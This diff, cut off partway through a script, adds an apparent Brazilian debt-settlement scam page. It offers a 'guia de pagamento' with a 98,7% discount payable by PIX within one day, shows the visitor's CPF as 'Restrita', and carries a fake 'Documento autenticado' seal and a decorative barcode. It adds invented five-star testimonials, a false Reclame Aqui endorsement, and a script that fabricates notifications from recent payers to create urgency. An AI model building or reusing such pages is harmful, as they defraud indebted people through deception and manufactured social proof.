@@ -1,0 +1,972 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<!-- Utmify -->
+
+<!-- Fim Utmify -->
+<!-- xTracky e TikTok removidos -->
+<script src="../js/utmify-utm.js" defer></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Guia de Pagamento - Acordo</title>
+
+  <style>
+    :root {
+      --pink: #ec0978;
+      --pink-600: #d0086c;
+      --pink-50: #fff4fa;
+      --ink: #0f172a;
+      --sky: #f8fafc;
+      --footer: #1e2433;
+      --muted: #6b7280;
+      --radius: 16px;
+    }
+
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+    html { height: 100% }
+    body {
+      min-height: 100%;
+      display: flex; flex-direction: column;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica", "Arial", sans-serif;
+      color: #111827;
+      background: var(--footer);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ===== Topbar ===== */
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      background: var(--pink);
+      border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+    .nav {
+      max-width: 1200px; margin: 0 auto; padding: 12px 20px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .brand { display: flex; align-items: center; gap: 10px }
+    .brand img { height: 40px; width: auto; display: block; filter: brightness(0) invert(1) }
+    .avatar { display: flex; align-items: center; gap: 8px }
+    .badge {
+      height: 36px; width: 36px; display: grid; place-items: center;
+      border-radius: 999px; background: rgba(255,255,255,.2); color: white;
+      font-weight: 700; font-size: .85rem;
+    }
+    .user-info { text-align: right; line-height: 1.3 }
+    .user-name { color: #fff; font-weight: 600; font-size: .85rem; white-space: nowrap }
+    .user-cpf-header { color: rgba(255,255,255,.7); font-size: .75rem; letter-spacing: .03em }
+
+    /* ===== Hero ===== */
+    .hero {
+      flex: 1;
+      padding: 24px 16px 40px;
+      background:
+        radial-gradient(ellipse 900px 500px at 65% -5%, rgba(236,9,120,.07) 0, transparent 70%),
+        radial-gradient(ellipse 600px 400px at 15% 20%, rgba(236,9,120,.04) 0, transparent 70%),
+        #f9fafb;
+    }
+    .shell { max-width: 540px; margin: 0 auto; display: grid; gap: 20px }
+
+    /* ===== Card ===== */
+    .card {
+      background: #fff;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: var(--radius);
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 8px 32px rgba(236,9,120,.06);
+      overflow: hidden;
+      transition: box-shadow .3s;
+    }
+    .card:hover {
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 12px 40px rgba(236,9,120,.1);
+    }
+    .card-head {
+      padding: 16px 20px;
+      display: flex; align-items: center; gap: 10px;
+      border-bottom: 1px solid rgba(0,0,0,.05);
+      background: linear-gradient(180deg, #fff 0%, #fffafd 100%);
+    }
+    .card-title { font-weight: 700; color: #111827; font-size: .95rem }
+    .card-body { padding: 20px }
+
+    /* Status dot */
+    .status-dot {
+      height: 10px; width: 10px; border-radius: 999px;
+      background: #22c55e; position: relative; flex-shrink: 0;
+    }
+    .status-dot::after {
+      content: ""; position: absolute; inset: -3px;
+      border-radius: 999px; background: #22c55e; opacity: .4;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); opacity: .4 }
+      50% { transform: scale(1.6); opacity: 0 }
+    }
+
+    /* ===== Guia de Pagamento (documento) ===== */
+    .guia {
+      border: 1.5px solid #cbd5e1;
+      border-radius: 6px;
+      overflow: hidden;
+      background:
+        repeating-linear-gradient(
+          0deg,
+          transparent,
+          transparent 39px,
+          rgba(30,58,95,.015) 39px,
+          rgba(30,58,95,.015) 40px
+        ),
+        linear-gradient(180deg, #fcfdff 0%, #fff 100%);
+      font-size: .82rem;
+      position: relative;
+    }
+    .guia::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0;
+      width: 4px; height: 100%;
+      background: linear-gradient(180deg, #1e3a5f, #162d4a, #2a4d6e, #1e3a5f);
+      z-index: 1;
+    }
+
+    /* Topo institucional */
+    .guia-topo {
+      background: linear-gradient(135deg, #1e3a5f, #162d4a);
+      color: #fff;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    .guia-topo-left { display: flex; align-items: center; gap: 10px }
+    .guia-topo-left img { height: 28px; filter: brightness(0) invert(1) }
+    .guia-topo-left .doc-title {
+      font-weight: 800; font-size: .85rem;
+      text-transform: uppercase; letter-spacing: .06em;
+    }
+    .guia-topo-right {
+      text-align: right; font-size: .7rem;
+      line-height: 1.4; opacity: .85;
+    }
+
+    /* Faixa do acordo */
+    .guia-acordo-bar {
+      background: #f1f5f9;
+      border-bottom: 1.5px solid #cbd5e1;
+      padding: 10px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .guia-acordo-num {
+      font-family: 'Courier New', Courier, monospace;
+      font-weight: 700;
+      font-size: .85rem;
+      color: var(--ink);
+      letter-spacing: .05em;
+    }
+    .guia-acordo-status {
+      display: inline-flex; align-items: center; gap: 5px;
+      background: #dcfce7;
+      border: 1px solid #86efac;
+      border-radius: 4px;
+      padding: 3px 10px;
+      font-size: .7rem;
+      font-weight: 700;
+      color: #15803d;
+      text-transform: uppercase;
+      letter-spacing: .04em;
+    }
+    .guia-acordo-status::before {
+      content: "";
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: #22c55e;
+    }
+
+    /* Seções */
+    .guia-section {
+      padding: 14px 18px 10px;
+      border-bottom: 1.5px solid #e2e8f0;
+    }
+    .guia-section:last-of-type { border-bottom: none }
+    .guia-section:nth-child(odd) {
+      background: rgba(248,250,252,.6);
+    }
+    .guia-section-title {
+      font-size: .68rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .08em;
+      color: #1e3a5f;
+      margin-bottom: 10px;
+      padding-bottom: 5px;
+      border-bottom: 1px solid rgba(30,58,95,.1);
+    }
+
+    /* Grid de campos */
+    .guia-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0;
+    }
+    .guia-grid-3 { grid-template-columns: 1fr 1fr 1fr }
+    .guia-campo {
+      padding: 8px 10px;
+      border: .5px solid #e8ecf1;
+      min-height: 48px;
+      background: rgba(255,255,255,.7);
+    }
+    .guia-campo:nth-child(even) {
+      background: rgba(248,250,252,.8);
+    }
+    .guia-campo-full { grid-column: 1 / -1 }
+    .guia-campo-label {
+      font-size: .62rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: .06em;
+      color: #94a3b8;
+      margin-bottom: 2px;
+    }
+    .guia-campo-value {
+      font-size: .82rem;
+      font-weight: 600;
+      color: var(--ink);
+      word-break: break-word;
+    }
+
+    /* Financeiro */
+    .guia-fin-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 9px 12px;
+      border-bottom: 1px solid #eef1f5;
+      font-size: .8rem;
+    }
+    .guia-fin-row:last-child { border-bottom: none }
+    .guia-fin-row:nth-child(even) { background: rgba(248,250,252,.5) }
+    .guia-fin-label { color: #64748b; font-weight: 500 }
+    .guia-fin-value { color: var(--ink); font-weight: 600 }
+    .guia-fin-desconto { color: #059669; font-weight: 700 }
+
+    /* Linha de recorte */
+    .guia-recorte {
+      border: none;
+      border-top: 1.5px dashed #94a3b8;
+      margin: 0;
+      position: relative;
+    }
+    .guia-recorte::before {
+      content: "\2702";
+      position: absolute;
+      top: -10px; left: 12px;
+      font-size: .85rem;
+      color: #94a3b8;
+      background: #fff;
+      padding: 0 4px;
+    }
+
+    /* Valor total destaque */
+    .guia-total-box {
+      background: linear-gradient(135deg, #eef3f9, #e8eef6);
+      border: 1.5px solid rgba(30,58,95,.15);
+      margin: 10px;
+      border-radius: 6px;
+      padding: 14px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .guia-total-label {
+      font-weight: 700;
+      font-size: .9rem;
+      color: #1e3a5f;
+    }
+    .guia-total-value {
+      font-weight: 900;
+      font-size: 1.35rem;
+      color: #1e3a5f;
+      letter-spacing: -.02em;
+    }
+
+    /* Rodapé da guia */
+    .guia-rodape {
+      background: #f8fafc;
+      border-top: 1.5px solid #e2e8f0;
+      padding: 10px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+    .guia-rodape-info {
+      font-size: .68rem;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+    .guia-selo {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 10px;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 4px;
+      font-size: .62rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .05em;
+      color: #64748b;
+      background: #fff;
+    }
+    .guia-selo svg { flex-shrink: 0 }
+
+    /* Código de controle */
+    .guia-barcode {
+      text-align: center;
+      padding: 10px 18px 14px;
+      background: #f8fafc;
+      border-top: 1px solid #e2e8f0;
+    }
+    .guia-barcode-lines {
+      display: flex;
+      justify-content: center;
+      gap: 1.5px;
+      margin-bottom: 4px;
+    }
+    .guia-barcode-lines span {
+      display: block;
+      width: 2px;
+      height: 28px;
+      background: var(--ink);
+      opacity: .7;
+    }
+    .guia-barcode-lines span.thin { width: 1px }
+    .guia-barcode-lines span.gap { width: 4px; background: transparent }
+    .guia-barcode-code {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: .68rem;
+      color: #64748b;
+      letter-spacing: .1em;
+    }
+
+    /* ===== Button ===== */
+    .btn {
+      display: block; width: 100%;
+      padding: 14px;
+      border: none; border-radius: 12px;
+      font-weight: 700; font-size: 1rem;
+      cursor: pointer;
+      transition: transform .15s, box-shadow .2s, background .2s;
+      text-align: center;
+      text-decoration: none;
+      color: #fff;
+    }
+    .btn:active { transform: scale(.98) }
+    .btn-pink {
+      background: var(--pink);
+      box-shadow: 0 4px 14px rgba(236,9,120,.3);
+    }
+    .btn-pink:hover { background: var(--pink-600); box-shadow: 0 6px 20px rgba(236,9,120,.35) }
+
+    .btn-green {
+      background: #22c55e;
+      box-shadow: 0 4px 14px rgba(34,197,94,.3);
+    }
+    .btn-green:hover { background: #16a34a; box-shadow: 0 6px 20px rgba(34,197,94,.35) }
+
+    .btn-wrap {
+      display: flex; flex-direction: column; align-items: center; gap: 8px;
+    }
+    .btn-secure {
+      display: flex; align-items: center; gap: 6px;
+      font-size: .75rem; color: var(--muted); font-weight: 500;
+    }
+    .btn-secure svg { flex-shrink: 0 }
+
+    /* ===== Reviews / Provas Sociais ===== */
+    .reviews-title {
+      font-size: .9rem; font-weight: 700; color: var(--ink);
+      text-align: center; margin-bottom: 14px;
+    }
+    .review {
+      display: flex; gap: 14px;
+      padding: 18px 0;
+      border-bottom: 1.5px solid #e2e8f0;
+    }
+    .review:last-child { border-bottom: none }
+    .review:first-child { padding-top: 6px }
+
+    .review-avatar {
+      width: 44px; height: 44px;
+      border-radius: 999px;
+      object-fit: cover;
+      flex-shrink: 0;
+      background: #f3f4f6;
+      border: 2px solid #fff;
+      box-shadow: 0 2px 8px rgba(0,0,0,.08);
+    }
+
+    .review-content { flex: 1; min-width: 0 }
+    .review-top {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 4px;
+    }
+    .review-name { font-weight: 700; font-size: .85rem; color: var(--ink) }
+    .review-name-lg { font-weight: 800; font-size: 1rem; color: var(--ink) }
+    .review-avatar-square { border-radius: 8px }
+    .review-stars { display: flex; gap: 1px }
+    .review-stars svg { width: 14px; height: 14px }
+    .review-text { font-size: .8rem; color: #4b5563; line-height: 1.5 }
+    .review-date { font-size: .7rem; color: #9ca3af; margin-top: 4px }
+
+    /* ===== Footer ===== */
+    footer {
+      background: var(--footer);
+      color: #94a3b8;
+      font-size: .8rem;
+    }
+    .foot {
+      max-width: 1200px; margin: 0 auto; padding: 14px 20px;
+      display: flex; align-items: center; justify-content: center; gap: 10px; flex-wrap: wrap;
+    }
+    .foot-logo { height: 20px; width: auto; opacity: .7 }
+    .foot-sep { opacity: .4 }
+    .foot a { color: #cbd5e1; text-decoration: none; transition: color .2s }
+    .foot a:hover { color: #fff }
+
+    /* ===== Notificações FOMO ===== */
+    .fomo {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      z-index: 900;
+      background: #fff;
+      border: 1px solid rgba(0,0,0,.08);
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.12), 0 2px 8px rgba(0,0,0,.06);
+      padding: 12px 16px 12px 12px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      max-width: 340px;
+      transform: translateX(-120%);
+      opacity: 0;
+      transition: transform .4s cubic-bezier(.4,0,.2,1), opacity .4s ease;
+      pointer-events: none;
+    }
+    .fomo.show {
+      transform: translateX(0);
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .fomo-avatar {
+      width: 38px; height: 38px;
+      border-radius: 999px;
+      display: grid; place-items: center;
+      flex-shrink: 0;
+      font-weight: 700;
+      font-size: .8rem;
+      color: #fff;
+    }
+    .fomo-svg-icon {
+      width: 38px; height: 38px;
+      border-radius: 10px;
+      display: grid; place-items: center;
+      flex-shrink: 0;
+    }
+    .fomo-svg-icon svg { width: 18px; height: 18px }
+    .fomo-text {
+      font-size: .8rem;
+      color: #374151;
+      line-height: 1.4;
+    }
+    .fomo-text strong { color: var(--ink); font-weight: 700 }
+    .fomo-time {
+      font-size: .65rem;
+      color: #9ca3af;
+      margin-top: 2px;
+    }
+    .fomo-close {
+      position: absolute;
+      top: 6px; right: 8px;
+      background: none; border: none;
+      color: #9ca3af; font-size: .75rem;
+      cursor: pointer; line-height: 1;
+      padding: 2px;
+    }
+    .fomo-close:hover { color: #6b7280 }
+
+    @media (max-width: 580px) {
+      .fomo {
+        left: 10px; right: 10px; bottom: 12px;
+        max-width: none;
+      }
+    }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 580px) {
+      .hero { padding: 16px 10px 32px }
+      .card-body { padding: 16px }
+      .guia-row { font-size: .8rem }
+      .guia-row-total .guia-value { font-size: 1.05rem }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== TOPBAR ===== -->
+  <header class="topbar">
+    <div class="nav">
+      <div class="brand">
+        <img src="images/logo.png" alt="Logo" onerror="this.style.display='none'">
+      </div>
+      <div class="avatar">
+        <div class="user-info">
+          <div class="user-name" id="user-display-name"></div>
+          <div class="user-cpf-header" id="user-display-cpf-header"></div>
+        </div>
+        <div class="badge">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="8.5" r="3.2" fill="#ffffff"></circle>
+            <path d="M4.5 19.5c0-3.2 3.4-5.2 7.5-5.2s7.5 2 7.5 5.2v.3H4.5v-.3z" fill="#ffffff"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== MAIN ===== -->
+  <main class="hero">
+    <div class="shell">
+
+      <!-- Guia de Pagamento -->
+      <div class="guia">
+        <!-- Topo institucional -->
+        <div class="guia-topo">
+          <div class="guia-topo-left">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"></rect><path d="M9 7h6M7 12h10M9 17h6"></path></svg>
+            <span class="doc-title">Guia de Pagamento</span>
+          </div>
+          <div class="guia-topo-right">
+            Documento gerado em<br><strong id="guia-data-topo">29/03/2026</strong>
+          </div>
+        </div>
+
+        <!-- Faixa do acordo -->
+        <div class="guia-acordo-bar">
+          <span class="guia-acordo-num">Nº 83N2L618362E</span>
+          <span class="guia-acordo-status">Acordo aprovado</span>
+        </div>
+
+        <!-- Dados do Pagador -->
+        <div class="guia-section">
+          <div class="guia-section-title">Dados do Pagador</div>
+          <div class="guia-grid">
+            <div class="guia-campo guia-campo-full">
+              <div class="guia-campo-label">Nome completo</div>
+              <div class="guia-campo-value" id="guia-nome">---</div>
+            </div>
+            <div class="guia-campo">
+              <div class="guia-campo-label">CPF</div>
+              <div class="guia-campo-value" id="guia-cpf">---</div>
+            </div>
+            <div class="guia-campo">
+              <div class="guia-campo-label">Situação cadastral</div>
+              <div class="guia-campo-value" style="color:#dc2626">Restrita</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Dados do Acordo -->
+        <div class="guia-section">
+          <div class="guia-section-title">Dados do Acordo</div>
+          <div class="guia-grid guia-grid-3">
+            <div class="guia-campo">
+              <div class="guia-campo-label">Data de emissão</div>
+              <div class="guia-campo-value" id="guia-data">29/03/2026</div>
+            </div>
+            <div class="guia-campo">
+              <div class="guia-campo-label">Validade</div>
+              <div class="guia-campo-value" id="guia-validade">30/03/2026</div>
+            </div>
+            <div class="guia-campo">
+              <div class="guia-campo-label">Forma de pagamento</div>
+              <div class="guia-campo-value">PIX</div>
+            </div>
+            <div class="guia-campo">
+              <div class="guia-campo-label">Parcelas</div>
+              <div class="guia-campo-value">1x (parcela única)</div>
+            </div>
+            <div class="guia-campo" style="grid-column: span 2">
+              <div class="guia-campo-label">Condição</div>
+              <div class="guia-campo-value">Quitação integral com desconto promocional</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Resumo Financeiro -->
+        <div class="guia-section">
+          <div class="guia-section-title">Resumo Financeiro</div>
+          <div class="guia-fin-row">
+            <span class="guia-fin-label">Valor original da dívida</span>
+            <span class="guia-fin-value">R$ 7.566,52</span>
+          </div>
+          <div class="guia-fin-row">
+            <span class="guia-fin-label">Desconto concedido (98,7%)</span>
+            <span class="guia-fin-desconto">− R$ 7.488,05</span>
+          </div>
+          <div class="guia-fin-row">
+            <span class="guia-fin-label">Encargos / juros</span>
+            <span class="guia-fin-value">R$ 0,00</span>
+          </div>
+        </div>
+
+        <!-- Linha de recorte -->
+        <hr class="guia-recorte">
+
+        <!-- Total a pagar -->
+        <div class="guia-total-box">
+          <span class="guia-total-label">Total a pagar</span>
+          <span class="guia-total-value">R$ 78,47</span>
+        </div>
+
+        <!-- Código de barras decorativo -->
+        <div class="guia-barcode">
+          <div class="guia-barcode-lines">
+            <span></span><span class="thin"></span><span></span><span class="gap"></span>
+            <span class="thin"></span><span></span><span class="thin"></span><span></span><span class="gap"></span>
+            <span></span><span></span><span class="thin"></span><span class="gap"></span>
+            <span class="thin"></span><span></span><span class="thin"></span><span></span><span class="thin"></span><span class="gap"></span>
+            <span></span><span class="thin"></span><span></span><span></span><span class="gap"></span>
+            <span class="thin"></span><span></span><span class="thin"></span><span class="gap"></span>
+            <span></span><span></span><span class="thin"></span><span></span><span class="gap"></span>
+            <span class="thin"></span><span></span><span class="thin"></span><span></span><span class="thin"></span><span class="gap"></span>
+            <span></span><span class="thin"></span><span></span><span class="thin"></span><span class="gap"></span>
+            <span></span><span class="thin"></span><span></span>
+          </div>
+          <div class="guia-barcode-code" id="guia-controle">83N2.L618.362E.0000</div>
+        </div>
+
+        <!-- Rodapé da guia -->
+        <div class="guia-rodape">
+          <div class="guia-rodape-info">
+            Parcela única via PIX. Após a confirmação,<br>
+            as restrições serão removidas em até 5 minutos.
+          </div>
+          <div class="guia-selo">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><polyline points="9 12 11 14 15 10" stroke-width="2"></polyline></svg>
+            Documento autenticado
+          </div>
+        </div>
+      </div>
+
+      <!-- Botão Gerar Pagamento -->
+      <div class="btn-wrap">
+        <a href="index.html#" id="btn-gerar-pagamento" class="btn btn-green">Gerar Pagamento via PIX</a>
+        <div class="btn-secure">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0110 0v4"></path></svg>
+          Pagamento seguro e criptografado
+        </div>
+      </div>
+
+      <!-- Provas Sociais -->
+      <div class="card">
+        <div class="card-body">
+          <div class="reviews-title">O que dizem nossos clientes</div>
+
+          <!-- Review 1 - Reclame Aqui -->
+          <div class="review">
+            <img class="review-avatar" src="images/Reclame.png" alt="Reclame Aqui">
+            <div class="review-content">
+              <div class="review-top">
+                <span class="review-name">Reclame Aqui!</span>
+                <div class="review-stars">
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                </div>
+              </div>
+              <p class="review-text">A empresa atingiu a reputação máxima no Reclame AQUI!</p>
+            </div>
+          </div>
+
+          <!-- Review 2 -->
+          <div class="review">
+            <img class="review-avatar" src="images/Elias.png" alt="Foto">
+            <div class="review-content">
+              <div class="review-top">
+                <span class="review-name">Elias Rodrigues</span>
+                <div class="review-stars">
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                </div>
+              </div>
+              <p class="review-text">Não acreditei no desconto de quase 99%. Paguei via PIX e na hora já recebi a confirmação. Recomendo demais!</p>
+              <div class="review-date">Há 3 dias</div>
+            </div>
+          </div>
+
+          <!-- Review 3 -->
+          <div class="review">
+            <img class="review-avatar" src="images/Carla.png" alt="Foto">
+            <div class="review-content">
+              <div class="review-top">
+                <span class="review-name">Carla Moreira</span>
+                <div class="review-stars">
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                </div>
+              </div>
+              <p class="review-text">Eu tinha medo de ser golpe, mas correu tudo certo. Paguei o valor do acordo e meu score já começou a subir no dia seguinte.</p>
+              <div class="review-date">Há 5 dias</div>
+            </div>
+          </div>
+
+          <!-- Review 4 -->
+          <div class="review">
+            <img class="review-avatar" src="images/Regina.png" alt="Foto">
+            <div class="review-content">
+              <div class="review-top">
+                <span class="review-name">Regina Santana</span>
+                <div class="review-stars">
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#d1d5db"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                </div>
+              </div>
+              <p class="review-text">Processo muito simples. Só tive que pagar via PIX e pronto. Meu nome foi limpo rapidamente. Queria ter feito isso antes.</p>
+              <div class="review-date">Há 1 semana</div>
+            </div>
+          </div>
+
+          <!-- Review 5 -->
+          <div class="review">
+            <img class="review-avatar" src="images/Frederico.png" alt="Foto">
+            <div class="review-content">
+              <div class="review-top">
+                <span class="review-name">Frederico Oliveira</span>
+                <div class="review-stars">
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                  <svg viewBox="0 0 24 24" fill="#f59e0b"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87L18.18 22 12 18.56 5.82 22 7 14.14l-5-4.87 6.91-1.01z"></path></svg>
+                </div>
+              </div>
+              <p class="review-text">Consegui limpar meu nome com um desconto incrível. O atendimento foi excelente e o pagamento por PIX foi instantâneo. Muito satisfeito!</p>
+              <div class="review-date">Há 1 semana</div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div><!-- .shell -->
+  </main>
+
+  <!-- ===== FOOTER ===== -->
+  <footer>
+    <div class="foot">
+      <img src="images/logo.png" alt="Logo" class="foot-logo">
+      <span>© <span id="y">2026</span> Central</span>
+      <span class="foot-sep">·</span>
+      <a href="index.html#">Privacidade</a>
+      <span class="foot-sep">·</span>
+      <a href="index.html#">Termos</a>
+    </div>
+  </footer>
+
+  <!-- Notificação FOMO -->
+  <div class="fomo" id="fomo-toast">
+    <div id="fomo-icon-wrap"></div>
+    <div>
+      <div class="fomo-text" id="fomo-text"></div>
+      <div class="fomo-time" id="fomo-time"></div>
+    </div>
+    <button class="fomo-close" onclick="document.getElementById('fomo-toast').classList.remove('show')">×</button>
+  </div>
+
+  <!-- ===== SCRIPTS ===== -->
+  <script>
+    // Notificações FOMO
+    (function() {
+      const pessoas = [
+        { nome: 'Maria C.', iniciais: 'MC', cor: '#e11d48' },
+        { nome: 'Jo\u00e3o S.', iniciais: 'JS', cor: '#2563eb' },
+        { nome: 'Ana R.', iniciais: 'AR', cor: '#7c3aed' },
+        { nome: 'Carlos M.', iniciais: 'CM', cor: '#0891b2' },
+        { nome: 'Fernanda L.', iniciais: 'FL', cor: '#db2777' },
+        { nome: 'Pedro H.', iniciais: 'PH', cor: '#059669' },
+        { nome: 'Juliana F.', iniciais: 'JF', cor: '#d97706' },
+        { nome: 'Rafael B.', iniciais: 'RB', cor: '#4f46e5' },
+        { nome: 'Beatriz N.', iniciais: 'BN', cor: '#be185d' },
+        { nome: 'Lucas P.', iniciais: 'LP', cor: '#0d9488' },
+        { nome: 'Camila A.', iniciais: 'CA', cor: '#9333ea' },
+        { nome: 'Marcos V.', iniciais: 'MV', cor: '#1d4ed8' },
+        { nome: 'Patricia G.', iniciais: 'PG', cor: '#c026d3' },
+        { nome: 'Roberto T.', iniciais: 'RT', cor: '#15803d' },
+        { nome: 'Sandra K.', iniciais: 'SK', cor: '#b91c1c' }
+      ];
+      const cidades = [
+        'S\u00e3o Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Salvador',
+        'Curitiba', 'Fortaleza', 'Bras\u00edlia', 'Recife', 'Manaus', 'Goi\u00e2nia'
+      ];
